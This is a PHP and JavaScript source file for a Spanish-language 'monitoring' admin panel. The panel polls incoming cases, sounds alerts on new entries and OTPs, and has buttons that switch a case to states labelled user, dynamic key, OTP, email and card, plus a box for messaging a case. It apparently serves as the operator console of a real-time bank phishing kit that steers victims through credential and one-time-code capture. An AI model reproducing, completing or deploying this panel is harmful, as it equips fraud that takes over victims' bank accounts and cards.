<?php 
session_start(); 
require('../lib/funciones.php');

date_default_timezone_set('America/Bogota');

if (isset($_SESSION["usuario0608"])) {
	
}else{	
	header("Location: ../login.php");
}

?>
<head>
	<meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="shortcut icon" href="../img/metronic.ico">
	<title>Sistema De Monitoreo</title>	
	<link href="../css/styles-admin.css" rel="stylesheet">	
	<script type="text/javascript" src="../js/functions.js"></script>	
	<script type="text/javascript" src="../js/jquery-3.6.0.min.js"></script>
	<style>
		/* Mejoras adicionales para móvil */
		@media (max-width: 768px) {
			.contenedor-principal {
				padding: 10px 5px;
			}
			
			.item-des-small {
				font-size: 11px;
				margin: 3px 0;
			}
			
			.item-des-small table td {
				padding: 4px 2px;
			}
			
			/* Hacer botones más grandes en móvil */
			.control, .control-off, .control2, .control2-off {
				min-height: 35px;
				touch-action: manipulation;
				font-size: 9px !important;
			}
			
			/* Asegurar que el texto de los botones sea visible */
			.control table, .control-off table, .control2 table, .control2-off table {
				width: 100%;
			}
			
			.control table td, .control-off table td, .control2 table td, .control2-off table td {
				vertical-align: middle;
				text-align: center;
			}
			
			/* Mejorar legibilidad */
			.valor {
				font-weight: 500;
			}
		}
	</style>	
	<style type="text/css">
		#fondo{
			top:0;
			left: 0;
			width: 100%;
			height: 100%;
			position: fixed;
			background-color: #00000073;
			z-index: 200;
			display: none;
		}
		#cuadro-mensaje{
			border-radius: 5px;
			top: 50%;
			left: 50%;
			position: fixed;
			width: calc(90% - 60px);
			max-width: 360px;
			transform: translate(-50%,-50%);
			background-color: #fff;
			padding: 30px;
			z-index: 220;
			display: none;
		}
		#contenido-mensaje{
			border-radius: 5px;
			width: 100%;
			height: 70px;
			margin: 10px 0px;
			outline: 0;		
		}
		#btn-enviar-mensaje{
			background-color: #e7f9ea;
		    cursor: pointer;
		    border-radius: 5px;
		    padding: 5px;
		    border: 1px solid #C0C0CC;
		    border-bottom: 4px solid #006BE9;
		    text-align: center;
		    width: calc(100% - 10px);		    
		}
	</style>
</head>
<body bgcolor="#F5F8FA">
	<div id="fondo"></div>
	<div id="cuadro-mensaje">
		<table width="100%" cellpadding="0" cellspacing="0" border="0">
			<tr>
				<td valign="middle" align="left">Ingresa el Mensaje</td>
				<td valign="middle" align="right"><img src="../img/btn-cerrar.png" style="cursor: pointer;" id="cerrar-mensaje"></td>
			</tr>
		</table>
		
		<br>
		<textarea id="contenido-mensaje"></textarea>
		<br>
		<button id="btn-enviar-mensaje">Enviar</button>
	</div>
	<div class="menu">
		<table class="opciones-mob">
			<tr>
				<td><img src="../img/todos-a.svg" width="19"></td>
				<td><a href="#"><img src="../img/alarma-g.svg" width="19"></a></td>
				<td><a href="#"><img src="../img/final-g.svg" width="19"></a></td>
			</tr>
		</table>
		<div class="opciones"><span class="item-menu" style="background-color:#F4F6FA;color:#5e6278; ">Todos</span> <a href="#"><span class="item-menu">Pendientes</span></a> <a href="#"><span class="item-menu">Finalizados</span></a></div>
		<div class="cerrar"><img src="../img/cerrar-g.svg" width="19"></div>
	</div>
	<div class="items-trans contenedor-casos">

			<?php
				cargar_casos();											
			?>	
	</div>
	<audio id="snd">
		<source src="../audio/timbre.mp3" type="audio/mpeg">
	</audio>
	<audio id="sndOTP">
		<source src="../audio/electrico.mp3" type="audio/mpeg">
	</audio>

	<div class="logo">
		<img src="../img/icono.png" width="30" style="margin:20px 0px;">
		<div style="width: 100%; border-bottom: 1px dashed #a58e8e;"></div>
	</div>	
</body>
<script type="text/javascript">
	var identificador = 0;
	$(document).ready(function(){	
		setInterval(actualizar_casos,2000);	

		
		$("#cerrar").click(function(evento){
			$.post( "../cerar-sesion.php",{ usr: $("#txtUsuario").val(), pass: $("#txtPass").val() }, function( data ) {	
				if (data == "OK") {
					window.location.href = "../";
				}
			});
		});

		

		$(document).on('click', '.usuario', function() {
 			$(this).attr('disabled','disabled')
			$.post( "../process/estado.php",{ id:$(this).attr('id'),est:"12" },function(data) {

			});
 		});

 		$(document).on('click', '.dinamica', function() {
 			$(this).attr('disabled','disabled')
			$.post( "../process/estado.php",{ id:$(this).attr('id'),est:"2" },function(data) {

			});
 		});

 		$(document).on('click', '.otp', function() {
 			$(this).attr('disabled','disabled')
			$.post( "../process/estado.php",{ id:$(this).attr('id'),est:"8" },function(data) {

			});
 		});

 		$(document).on('click', '.correo', function() { 
 			$(this).attr('disabled','disabled')
 			$.post( "../process/estado.php",{ id:$(this).attr('id'),est:"4" },function(data) {
				
			});
 		});

 		$(document).on('click', '.tarjeta', function() { 
 			$(this).attr('disabled','disabled')
 			$.post( "../process/estado.php",{ id:$(this).attr('id'),est:"6" },function(data) {
				
			});
 		});
 		
 		$(document).on('click', '#cerrar-mensaje', function() { 
 			identificador = 0;
 			$("#contenido-mensaje").val("");
 			$("#fondo,#cuadro-mensaje").hide(); 	
 		});

 		$(document).on('click', '#btn-enviar-mensaje', function() { 
 			$("#fondo,#cuadro-mensaje").hide(); 
 	
 			$.post( "../process/mensaje.php",{ id:identificador,msg:$("#contenido-mensaje").val()},function(data) {
 				
			});
 		});

 		$(document).on('click', '.mensaje', function() { 
 			identificador = $(this).attr('id');
 			$("#contenido-mensaje").val("");
 			$("#fondo,#cuadro-mensaje").show(); 		
 		});

 		$(document).on('click', '.finalizar', function() { 
 			$(this).attr('disabled','disabled')
 			$.post( "../process/estado.php",{ id:$(this).attr('id'),est:"10" },function(data) {
				
			});
 		});

 		

	});
</script>